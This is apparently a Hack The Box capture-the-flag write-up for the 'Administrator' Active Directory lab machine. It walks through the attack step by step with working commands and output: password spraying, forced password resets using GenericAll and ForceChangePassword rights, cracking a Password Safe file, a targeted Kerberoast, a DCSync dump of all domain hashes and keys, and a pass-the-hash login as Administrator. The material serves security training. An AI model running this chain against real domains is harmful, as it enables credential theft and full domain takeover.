---
{"dg-publish":true,"permalink":"/ct-fs/htb/administrator/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #leaked_creds #AD #bloodhound #targeted_kerberoast #DCSync #ftp #john #psafe3 

## Recon
![Pasted image 20260923112757.png](/img/user/CTFs/HTB/Images/Administrator%20Images/Pasted%20image%2020260923112757.png)

### Nmap:
```zsh
************************************************************
nmap -p21,53,135,88,139,389,445,464,593,636,3269,3268,5985,9389,47001,49665,49664,49666,49667,49668,55370,55360,55365,55373,55390 -sV -sC -T4 -Pn -oA 10.129.117.125 10.129.117.125
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p21,53,135,88,139,389,445,464,593,636,3269,3268,5985,9389,47001,49665,49664,49666,49667,49668,55370,55360,55365,55373,55390 -sV -sC -T4 -Pn -oA 10.129.117.125 10.129.117.125
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 14:29 -0400
Nmap scan report for 10.129.117.125
Host is up (0.093s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 01:29:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
55360/tcp open  msrpc         Microsoft Windows RPC
55365/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55370/tcp open  msrpc         Microsoft Windows RPC
55373/tcp open  msrpc         Microsoft Windows RPC
55390/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m56s
| smb2-time: 
|   date: 2026-09-24T01:30:06
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.33 seconds
```
Initial port scanning shows the typical suite of windows ports open as well as an ftp server on port 21. We're also starting with a set of creds in an assumed breach format.

### Port 445 (SMB) & 389 (LDAP)
#### Manual Enumeration (nxc)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/administrator]
└─$ nxc smb administrator.htb -u 'Olivia' -p 'ichliebedich' --shares
SMB         10.129.117.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.117.125  445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.117.125  445    DC               [*] Enumerated shares
SMB         10.129.117.125  445    DC               Share           Permissions     Remark
SMB         10.129.117.125  445    DC               -----           -----------     ------
SMB         10.129.117.125  445    DC               ADMIN$                          Remote Admin
SMB         10.129.117.125  445    DC               C$                              Default share
SMB         10.129.117.125  445    DC               IPC$            READ            Remote IPC
SMB         10.129.117.125  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.117.125  445    DC               SYSVOL          READ            Logon server share 
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/administrator]
└─$ nxc smb administrator.htb -u 'Olivia' -p 'ichliebedich' --users 
SMB         10.129.117.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.117.125  445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.117.125  445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.117.125  445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain 
SMB         10.129.117.125  445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.117.125  445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account 
SMB         10.129.117.125  445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.129.117.125  445    DC               michael                       2024-10-06 01:33:37 0        
SMB         10.129.117.125  445    DC               benjamin                      2024-10-06 01:34:56 0        
SMB         10.129.117.125  445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.129.117.125  445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.129.117.125  445    DC               alexander                     2024-10-31 00:18:04 0        
SMB         10.129.117.125  445    DC               emma                          2024-10-31 00:18:35 0        
SMB         10.129.117.125  445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
```
Taking a look at what shares our user has access too we don't see anything super enticing there. However, we are able to enumerate a valid list of users on this machine. Adding DC hostname to our `/etc/hosts`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/administrator]
└─$ nxc smb administrator.htb -u users.txt -p 'ichliebedich' --shares       
SMB         10.129.117.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.117.125  445    DC               [-] administrator.htb\Administrator:ichliebedich STATUS_LOGON_FAILURE 
SMB         10.129.117.125  445    DC               [-] administrator.htb\Guest:ichliebedich STATUS_LOGON_FAILURE 
SMB         10.129.117.125  445    DC               [-] administrator.htb\krbtgt:ichliebedich STATUS_LOGON_FAILURE 
SMB         10.129.117.125  445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.129.117.125  445    DC               [*] Enumerated shares
```
as a sanity check, I password sprayed `Olivia's` password against all users to see if reuse was viable.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/administrator]
└─$ nxc ldap administrator.htb -u 'Olivia' -p 'ichliebedich' --bloodhound --collection ALL --dns-server 10.129.117.125
LDAP        10.129.117.125  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.117.125  389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.129.117.125  389    DC               Resolved collection methods: dcom, objectprops, session, container, trusts, acl, psremote, localadmin, rdp, group
LDAP        10.129.117.125  389    DC               Done in 0M 22S
LDAP        10.129.117.125  389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.117.125_2026-09-23_151149_bloodhound.zip
```
I also took this opportunity to pull down `bloodhound` loot to analyze the Domain for exploit pathways.

### Certificate Enumeration

```zsh
┌──(kali㉿kali)-[~/…/HTB/administrator/files/bloodhound]
└─$ certipy-ad find -u Olivia@DC.administrator.htb -p 'ichliebedich' -dc-ip 10.129.117.125 -target 10.129.117.125 -ldap-scheme ldap
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 0 certificate templates
[*] Finding certificate authorities
[*] Found 0 certificate authorities
[*] Found 0 enabled certificate templates
[*] Finding issuance policies
[*] Found 1 issuance policy
[*] Found 0 OIDs linked to templates
[*] Saving text output to '20260923151721_Certipy.txt'
[*] Wrote text output to '20260923151721_Certipy.txt'
[*] Saving JSON output to '20260923151721_Certipy.json'
[*] Wrote JSON output to '20260923151721_Certipy.json'

```
Nothing came up when attempting to pull ADCS info on this machine.

### Port 5985 (WinRM)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/administrator]
└─$ evil-winrm -i 10.129.117.125 -u 'Olivia' -p 'ichliebedich'                        
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```
Testing our creds in `evil-winrm` we do find we can get an active session on the machine.

```zsh
*Evil-WinRM* PS C:\inetpub> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

## Initial Access

### Bloodhound Enumeration
![Pasted image 20260923124256.png](/img/user/CTFs/HTB/Images/Administrator%20Images/Pasted%20image%2020260923124256.png)
Looking through `Olivia's` outbound object control we see she has the `GenericAll` permission set for user `michael`. This gives us the ability to change his password without knowing his current one. We can accomplish this via `net rcp password`.

```zsh
net rpc password 'michael' 'NewSecurePass123!' -U 'administrator/Olivia%ichliebedich' -S 10.129.117.125
```
We successfully change `michael's` password to one we can store on our end.

![Pasted image 20260923124554.png](/img/user/CTFs/HTB/Images/Administrator%20Images/Pasted%20image%2020260923124554.png)
Exploring `Michael's` outbound object control we see they have the `ForceChangePassword` permission set for user `Benjamin`. This means we can reset `Benjamin's` password just like we did to `michael`.

```zsh
*Evil-WinRM* PS C:\Users\michael> dir Desktop
*Evil-WinRM* PS C:\Users\michael> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----         9/23/2026   7:47 PM                michael
d-----         9/23/2026   7:22 PM                olivia
d-r---         10/4/2024  10:08 AM                Public

```
Peeling off to enumerate Michael's User folder we see their desktop is empty. This was also the case with Olivia. I'm assuming we eventually will work our way into accessing Emily's files where I suspect `user.txt` is hiding.

```zsh
└─$ net rpc password 'benjamin' 'NewSecurePass123!' -U 'administrator/michael%NewSecurePass123!' -S 10.129.117.125
```
We successfully change Benjamin's password with Michael's creds using `net rpc password`.

### Port 21 (FTP)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/administrator]
└─$ ftp benjamin@administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||53859|)
150 Opening ASCII mode data connection.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
```
Since we don't have remote management access as Benjamin, and he is apart of `Share Moderators`, we attempt his creds against their open FTP server and we successfully authenticate to the server. Inside we find one file: `Backup.psafe3`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/administrator/loot]
└─$ pwsafe2john Backup.psafe3 
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```
From there we generate a `jtr` formated hash with `pwsafe2john` and output that to `psafe.hash`.

```zsh
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2026-09-23 16:03) 4.347g/s 35617p/s 35617c/s 35617C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We successfully crack the archive master password as `Backu:tekieromucho`.

![Pasted image 20260923131127.png](/img/user/CTFs/HTB/Images/Administrator%20Images/Pasted%20image%2020260923131127.png)
Using `passwordsafe` inside kali we successfully authenticate to the db with our cracked password revealing entries for users: `Alexander`, `Emily` and `Emma`. Emily is our current target.

![Pasted image 20260923131517.png](/img/user/CTFs/HTB/Images/Administrator%20Images/Pasted%20image%2020260923131517.png)
We successfully exfil `Emily's` password from the db.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/administrator]
└─$ nxc smb DC.administrator.htb -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --shares 
SMB         10.129.117.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.117.125  445    DC               [+] administrator.htb\Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
SMB         10.129.117.125  445    DC               [*] Enumerated shares
SMB         10.129.117.125  445    DC               Share           Permissions     Remark
SMB         10.129.117.125  445    DC               -----           -----------     ------
SMB         10.129.117.125  445    DC               ADMIN$                          Remote Admin
SMB         10.129.117.125  445    DC               C$                              Default share
SMB         10.129.117.125  445    DC               IPC$            READ            Remote IPC
SMB         10.129.117.125  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.117.125  445    DC               SYSVOL          READ            Logon server share 
```
We successfully authenticate as `Emily` on our target.

```zsh
*Evil-WinRM* PS C:\Users\emily> dir Desktop


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         9/23/2026   6:27 PM             34 user.txt

```
We find our `user.txt` file on Emily's Desktop.

## Privilege Escalation

![Pasted image 20260923132321.png](/img/user/CTFs/HTB/Images/Administrator%20Images/Pasted%20image%2020260923132321.png)
Enumerating Emily's outbound object control we see that she has the `GenericWrite` permission set for user `Ethan` allowing us to make a targeted kerberoast attack against Ethan and get their tgs hash.

![Pasted image 20260923132808.png](/img/user/CTFs/HTB/Images/Administrator%20Images/Pasted%20image%2020260923132808.png)
This is important because Ethan can has the `GetChangesAll` attribute along with DCSync capabilities (bloodhound error not showing it). We can perform a DCSync attack against the DC to get the password has for `Administrator`.



```zsh
┌──(p3v)─(kali㉿kali)-[~/…/administrator/exploit/privesc/targetedKerberoast]
└─$ faketime '2026-09-24 00:31:40' python3 targetedKerberoast.py -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -d administrator.htb --request-user ethan --dc-ip 10.129.117.125
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$540a7193d0e174333ece4f3dd0fd1902$3ef0a291b9a86a46ff7dde8bc789e97db2ffd9c2504140af1403f9d90976f8c23d7d634f7edefaef38b8add627879e5d72b4576ca9f90792867ec7a6f0bbd6787a17ae32f794cf1fa43b5d2ba14bfe0af3a5e5b9ef206f4a432969a5a31251da452945842e3cdd826bbd64f749134ee0f121f3d741d7b8e3a114a0e91fe5dc4aef5cfbfda6c6924960da560342d321d187979e9ec0bdcefedaae5a7c8e4291c9a704aa71e99ab11f0b5ae8af3562afc7e2459d463d70daaa04d3876c7d9e3c9f68b65ac7407a797d71de116bca5c01cdf453d234273989c2283d103238beb60c6cfe2577279a0791d283b5555f30993589433f743c4b991d264fa9817d447a7bb2d718a6c3f18da22aa69220dfe641ff49734142a08233f53cb2ed5bea89bd0d86c4e8218316726b2657dd56bddd69e9bf9b8be6eaf89d11624d1acaed1acbcb33a56e3a4df34183e4db14ee38520397987d273baf88f4d642c55d11c67186c226a113cdc9fc81ecb856c007d96167fb98e78c7fe618a20533939c794d9e8e111f1e9c30da5485dc8c033e602499e8891326d1e5bd68a5e3161a7f0ca76e84be1b2a86eee142b9f3c976e34817f158d67c516391d2b6b9609ce10c38cac3933fc34fcf2d094eabbb33df6295e9da6cf7a8501a03f9ad124865a14628c878e2f6f0f43bf78f17bea4d83e23e687973abeb176fddb87f3ebf97148045402a8bbb34a814db331396a321386bcdb7bb49d86d4ed237baff9426369ee944e07758f5d44383407a5d26595bdf6336b2404d6e06e35c45f61b651450d4ae755ef7f3709feddbfefe4fcdd67d12ce85095bf9deef83164693131c2809c5b1ad6029be29c4b3798edb53eea95cd7312609e68fe76b76a1f2240958c9079534aa2f207a0c9ae455a15c0dee4f3b8dfaee6e7d92434f97ed3f1deaf246de3736291fb3c21df65638640cdf4ceae83ba363fd0bc66eff6ce3072f2c00063dd852be85393ed7542cf2031f6046f30e1686519612e3466f3f93cd286f90890a478008a43b266da365bc0d3eff956f2c440e4f8ae2293441e5f94a0f4f90983651a16904068ba10b49a9060b80cf7a7442d64e149688d983594fbdab9f51f099b6fe5d28af44c4790b6ed9fb0426fc0bc4855b2e26f0f905c92a10f1dd0e3c8159914c47dde7c324d9bc0eb9920dbbd1c13b1d23b5742b5dabf1c95609a185789d5c816a835a5098c8dac50e651f8c4868a2bcd4e6a67f8ff2c9a26dcf301f8667a9a30651efb3fb0598d78aa3209f1a058bcf44c4f5a28825d2fc4dbdada2755eb57d0e5cdf9d4f491bd38da2986fefa28420a00e9a0a018f87a232353c48ec44d165e6ab26c523e976e417008427d6b8bfbe2034357fdade0aa27aa4da18b4f8e9916e9fb4db623f40c7733cffda92d0db0ec85f516c2893539e5aa3ee7daf7b08f71d9a848b6e57a3cb91778f8de7626f25bc0180aa398ecc8667f1f76c53ad3067782643969cce96e3dd6eb7ea4ca37b2a6c64aea3cf69b56a344f7cf8eb8ba2de7011cfa
```
We successfully get Ethan's TGS hash with `targetedkerberoast.py`.

```zsh
┌──(kali㉿kali)-[~/…/HTB/administrator/exploit/privesc]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ethan_tgs.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2026-09-23 17:34) 12.50g/s 64000p/s 64000c/s 64000C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We successfully crack for Ethan's password: `limpbizkit`

```zsh
──(kali㉿kali)-[~/…/HTB/administrator/exploit/privesc]
└─$ impacket-secretsdump -dc-ip 10.129.117.125 administrator.htb/ethan:limpbizkit@DC.administrator.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:d1116f55849aed748d1642c315a25693:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:d1116f55849aed748d1642c315a25693:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:12cf8442bf13c1b85ec8c2d4d4cca88124095b9053b05be46584c27749872e8d
administrator.htb\michael:aes128-cts-hmac-sha1-96:f91afd8195600e0b41a13ad5b62cc88e
administrator.htb\michael:des-cbc-md5:d98c1901fde6bf4c
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:b11a71eb03057932dffdace504c17e509cacf942a4539f6d68ffbb726d9c0732
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:676d9761e9e8d617a17d06ad4ddee84b
administrator.htb\benjamin:des-cbc-md5:3ef89204fd1cce91
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
```
Because of our bloodhound enumeration earlier we know that Ethan can perform a DC Sync attack against the DC. We use `secretsdump` to pull the hashes for all possible accounts on the machine including `Administrator`.

```zsh
┌──(kali㉿kali)-[~/…/HTB/administrator/exploit/privesc]
└─$ evil-winrm -H '3dc553ce4b9fd20bd016e098d2d2fd2e' -u Administrator -i 10.129.117.125
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/23/2026   6:27 PM             34 root.txt

```
From there we successfully get an `evil-winrm` session passing the hash for Administrator on our target. pwned.


## Final Thoughts
>[!Takeaways]
>- When enumerating `GenericWrite` and you keep getting errors using Shadow Credential attacks, try a targeted kerberoast instead (provided the hash is weak enough)

